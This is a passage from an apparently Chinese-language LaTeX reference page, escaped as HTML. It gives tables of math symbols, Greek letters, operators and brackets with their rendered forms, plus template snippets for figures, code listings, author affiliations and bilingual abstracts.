&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;数学符号&#34;&gt;数学符号&lt;/h2&gt;
&lt;h3 id=&#34;常用数学符号&#34;&gt;常用数学符号&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Code&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Latex&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Code&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Latex&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\because&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\because$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\therefore&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\therefore$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\frac{a}{b}&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\frac{a}{b}$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\dfrac{a}{b}&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\dfrac{a}{b}$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\cdot&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\cdot$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\cdots&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\cdots$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\ldots&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\ldots$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\infty&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\infty$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\log&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\log$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\lim&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\lim$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\sin&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\sin$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\cos&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\cos$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\rightarrow&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\rightarrow$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\int_{0}^{1}&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\int_{0}^{1}$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\iint&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\iint$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\oint&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\oint$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\oiint&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\oiint$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\iiint&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\iiint$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\in&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\in$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\notin&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\notin$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\forall&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\forall$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\exist&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\exist$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\sqrt{a}&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\sqrt{a}$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\exist&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\exist$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\neg&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\neg$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\oplus&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\oplus$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;code&gt;\sum\limits\_{i=1}^{10}&lt;/code&gt;:  $\sum\limits_{i=1}^{10}$&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\prod\limits\_{i=1}^{10}&lt;/code&gt;: $\prod\limits_{i=1}^{10}$&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\lim\limits\_{i\rightarrow+\infty}&lt;/code&gt;: $\lim\limits_{i\rightarrow+\infty}$&lt;/p&gt;
&lt;h3 id=&#34;希腊字母&#34;&gt;希腊字母&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Code&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Latex&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Code&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Latex&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\alpha&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\alpha$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\varepsilon&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\varepsilon$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\delta&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\delta$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\pi&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\pi$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\rho&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\rho$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\lambda&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\lambda$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\varphi&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\varphi$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\mu&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\mu$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\Delta&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\Delta$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\Sigma&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\Sigma$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\Pi&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\Pi$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\theta&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\theta$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;二元运算符&#34;&gt;二元运算符&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Code&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Latex&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Code&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Latex&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\equiv&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\equiv$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\neq&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\neq$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\leqslant&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\leqslant$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\geqslant&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\geqslant$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\sim&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\sim$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\approx&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\approx$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\mid&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\mid$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\nmid&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\nmid$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\pm&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\pm$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\times&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\times$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\cup&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\cup$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\cap&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\cap$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\subset&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\subset$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\supset&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\supset$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;括号&#34;&gt;括号&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Code&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Latex&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Code&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Latex&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\left( \right)&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\left(\right)$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\left[ \right]&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\left[\right]$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\left\\{ \right\\}&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\left{\right}$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\left\lbrace \right\rbrace&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\left\lbrace\right\rbrace$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\left&amp;lt; \right&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\left&amp;lt;\right&amp;gt;$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\left) \right(&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\left) \right($&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;\left|\right|&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\left|\right|$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;\left&amp;amp;#124; \right&amp;amp;#124;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\left&amp;amp;#124; \right&amp;amp;#124;$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;\left\{ \right.&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;$\left{ \right.$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;图片&#34;&gt;图片&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\usepackage&lt;/span&gt;{graphicx}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\usepackage&lt;/span&gt;{subfigure}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\usepackage&lt;/span&gt;{caption2}

&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\figurename&lt;/span&gt;}{图}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\captionlabeldelim&lt;/span&gt;}{.}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\thesubfigure&lt;/span&gt;} {&lt;span style=&#34;color:#66d9ef&#34;&gt;\thefigure&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;\arabic&lt;/span&gt;{subfigure}} &lt;span style=&#34;color:#66d9ef&#34;&gt;\makeatletter&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\@&lt;/span&gt;thesubfigure}{&lt;span style=&#34;color:#66d9ef&#34;&gt;\thesubfigure&lt;/span&gt;:&lt;span style=&#34;color:#66d9ef&#34;&gt;\space&lt;/span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\p&lt;/span&gt;@subfigure}{} &lt;span style=&#34;color:#66d9ef&#34;&gt;\makeatother&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{document}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{figure}[h]
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\centering&lt;/span&gt;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\includegraphics&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[width=0.8\textwidth]&lt;/span&gt;{filepath/pngname.png}
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\caption&lt;/span&gt;{caption of this figure}
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\label&lt;/span&gt;{label of this figure}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{figure}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{figure}[H]
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\centering&lt;/span&gt;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\subfigure&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[caption of this subfigure-1]&lt;/span&gt;{
			&lt;span style=&#34;color:#66d9ef&#34;&gt;\includegraphics&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[width=0.45\textwidth]&lt;/span&gt;{filepath/pngname}
			&lt;span style=&#34;color:#66d9ef&#34;&gt;\label&lt;/span&gt;{label of this subfigure-1}
		}
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\subfigure&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[caption of this subfigure-2]&lt;/span&gt;{
			&lt;span style=&#34;color:#66d9ef&#34;&gt;\includegraphics&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[width=0.45\textwidth]&lt;/span&gt;{filepath/pngname}
			&lt;span style=&#34;color:#66d9ef&#34;&gt;\label&lt;/span&gt;{label of this subfigure-2}
		}
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\caption&lt;/span&gt;{caption of figures}
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\label&lt;/span&gt;{label of figures}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{figure}
	use &lt;span style=&#34;color:#66d9ef&#34;&gt;\ref&lt;/span&gt;{label of this figure} to quote it. &lt;span style=&#34;color:#75715e&#34;&gt;%交叉引用
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{document}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;代码块&#34;&gt;代码块&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\usepackage&lt;/span&gt;{listings}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\usepackage&lt;/span&gt;{xcolor}

&lt;span style=&#34;color:#66d9ef&#34;&gt;\setmonofont&lt;/span&gt;{Consolas}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\setsansfont&lt;/span&gt;{Consolas}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\lstset&lt;/span&gt;{
	columns=fixed,
	breakatwhitespace=true,
	breaklines=true,
	breakindent=26pt,
	captionpos=bl,
	numbers=left,
	frame=shadowbox,
	basicstyle=&lt;span style=&#34;color:#66d9ef&#34;&gt;\ttfamily&lt;/span&gt;,
	keywordstyle=&lt;span style=&#34;color:#66d9ef&#34;&gt;\ttfamily\color&lt;/span&gt;{blue},
	numberstyle=&lt;span style=&#34;color:#66d9ef&#34;&gt;\footnotesize\color&lt;/span&gt;{darkgray},
	commentstyle=&lt;span style=&#34;color:#66d9ef&#34;&gt;\ttfamily\it\color&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[RGB]&lt;/span&gt;{0,96,96},
	stringstyle=&lt;span style=&#34;color:#66d9ef&#34;&gt;\ttfamily\color&lt;/span&gt;{magenta},
	showstringspaces=false,
	language=Java,
	identifierstyle=&lt;span style=&#34;color:#66d9ef&#34;&gt;\ttfamily&lt;/span&gt;,
	tabsize=4,
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{document}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{lstlisting}[title={&lt;span style=&#34;color:#66d9ef&#34;&gt;\bf&lt;/span&gt; your.title}]
&lt;span style=&#34;color:#75715e&#34;&gt;% put your code here
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{lstlisting}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{document}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;作者&#34;&gt;作者&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\usepackage&lt;/span&gt;{authblk}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand*&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\Affilfont&lt;/span&gt;}{&lt;span style=&#34;color:#66d9ef&#34;&gt;\small&lt;/span&gt;} &lt;span style=&#34;color:#75715e&#34;&gt;% 修改机构名称的字体与大小
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand\Authand&lt;/span&gt;{, } &lt;span style=&#34;color:#75715e&#34;&gt;% 去掉 and 前的逗号
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;\title&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\textbf&lt;/span&gt;{Title} }
&lt;span style=&#34;color:#66d9ef&#34;&gt;\author&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[1]&lt;/span&gt;{xxx}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\author&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[2]&lt;/span&gt;{xxx}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\affil&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[1]&lt;/span&gt;{(&lt;span style=&#34;color:#66d9ef&#34;&gt;\it&lt;/span&gt; xx大学&lt;span style=&#34;color:#66d9ef&#34;&gt;\ &lt;/span&gt;xx学院,&lt;span style=&#34;color:#66d9ef&#34;&gt;\ \rm&lt;/span&gt; 0000)}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\affil&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[2]&lt;/span&gt;{(&lt;span style=&#34;color:#66d9ef&#34;&gt;\it&lt;/span&gt; xx大学&lt;span style=&#34;color:#66d9ef&#34;&gt;\ &lt;/span&gt;xx学院,&lt;span style=&#34;color:#66d9ef&#34;&gt;\ \rm&lt;/span&gt; 0000)}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\date&lt;/span&gt;{}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要&lt;/h2&gt;
&lt;p&gt;中英文摘要&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\newcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\enabstractname&lt;/span&gt;}{Abstract}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\newcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\cnabstractname&lt;/span&gt;}{摘要}
&lt;span style=&#34;color:#66d9ef&#34;&gt;\newenvironment&lt;/span&gt;{cnabstract}{&lt;span style=&#34;color:#75715e&#34;&gt;%
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;\par\small&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\noindent\mbox&lt;/span&gt;{}&lt;span style=&#34;color:#66d9ef&#34;&gt;\hfill&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\bfseries&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;\cnabstractname&lt;/span&gt;}&lt;span style=&#34;color:#66d9ef&#34;&gt;\hfill\mbox&lt;/span&gt;{}&lt;span style=&#34;color:#66d9ef&#34;&gt;\par&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\vskip&lt;/span&gt; 2.5ex}{&lt;span style=&#34;color:#66d9ef&#34;&gt;\par\vskip&lt;/span&gt; 2.5ex}

&lt;span style=&#34;color:#66d9ef&#34;&gt;\newenvironment&lt;/span&gt;{enabstract}{&lt;span style=&#34;color:#75715e&#34;&gt;%
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;\par\small&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\noindent\mbox&lt;/span&gt;{}&lt;span style=&#34;color:#66d9ef&#34;&gt;\hfill&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\bfseries&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;\enabstractname&lt;/span&gt;}&lt;span style=&#34;color:#66d9ef&#34;&gt;\hfill\mbox&lt;/span&gt;{}&lt;span style=&#34;color:#66d9ef&#34;&gt;\par&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\vskip&lt;/span&gt; 1.5ex}{&lt;span style=&#34;color:#66d9ef&#34;&gt;\par\vskip&lt;/span&gt; 2.5ex} 

&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{document}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{cnabstract}
		xxx
		
		&lt;span style=&#34;color:#66d9ef&#34;&gt;\textbf&lt;/span&gt;{关键词：}xxx;xxx;xxx
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{cnabstract}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{enabstract}
		xxx
		
